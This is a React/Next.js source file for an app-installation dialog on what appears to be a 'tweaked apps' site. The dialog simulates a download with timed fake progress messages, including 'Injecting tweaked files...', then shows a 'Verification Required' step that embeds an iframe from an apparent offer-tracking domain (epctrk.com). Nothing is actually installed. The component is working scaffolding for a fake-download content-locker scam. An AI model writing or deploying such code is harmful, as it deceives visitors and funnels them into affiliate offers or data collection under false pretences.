'use client';

import { useState, useEffect } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from '@/components/ui/dialog';
import { Button } from './ui/button';
import { Progress } from './ui/progress';
import type { App } from '@/lib/apps';
import { CheckCircle } from 'lucide-react';
import Image from 'next/image';

type InstallationModalProps = {
  app: App | null;
  onClose: () => void;
};

export function InstallationModal({ app, onClose }: InstallationModalProps) {
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState('Initializing...');

  useEffect(() => {
    if (app) {
      setProgress(0);
      setStatus('Initializing...');
      const timers: NodeJS.Timeout[] = [];

      timers.push(
        setTimeout(() => {
          setProgress(25);
          setStatus('Connecting to server...');
        }, 1000)
      );
      timers.push(
        setTimeout(() => {
          setProgress(50);
          setStatus(`Downloading ${app.name}...`);
        }, 2500)
      );
      timers.push(
        setTimeout(() => {
          setProgress(75);
          setStatus('Injecting tweaked files...');
        }, 4000)
      );
      timers.push(
        setTimeout(() => {
          setProgress(100);
          setStatus('Installation complete!');
        }, 5500)
      );

      return () => {
        timers.forEach(clearTimeout);
      };
    }
  }, [app]);

  if (!app) {
    return null;
  }
  
  const isComplete = progress === 100;

  return (
    <Dialog open={!!app} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="sm:max-w-[425px] p-0">
        <DialogHeader className="p-6 pb-0">
          <div className="flex justify-center mb-4">
            <Image
              src={app.icon}
              alt={`${app.name} icon`}
              width={80}
              height={80}
              className="rounded-xl object-contain"
              data-ai-hint={app.iconHint}
            />
          </div>
          <DialogTitle className="text-2xl text-center font-headline">
            {isComplete ? 'Verification Required' : `Installing ${app.name}`}
          </DialogTitle>
          <DialogDescription className="text-center">
            {isComplete ? `To finish installing ${app.name}, please complete the final step.` : 'Your download will begin shortly.'}
          </DialogDescription>
        </DialogHeader>
        <div className="grid gap-4 py-4 px-6">
          {!isComplete && (
            <>
              <div className="space-y-2">
                <Progress value={progress} className="w-full" />
                <p className="text-sm text-muted-foreground text-center">{status}</p>
              </div>
              <div className="text-sm text-center text-muted-foreground space-y-2 rounded-lg border p-4">
                  <p>Please wait while we prepare your app. This may take a moment.</p>
              </div>
            </>
          )}
        </div>
        {isComplete ? (
          <div className="w-full h-[400px] overflow-hidden">
            <iframe
              src="https://epctrk.com/Verify4ow"
              scrolling="no"
              marginWidth={0}
              marginHeight={0}
              frameBorder="0"
              width="100%"
              height="100%"
            >
            </iframe>
          </div>
        ) : (
            <div className="p-6 pt-0">
                <Button onClick={onClose} variant="outline" className="w-full">
                    Cancel
                </Button>
            </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
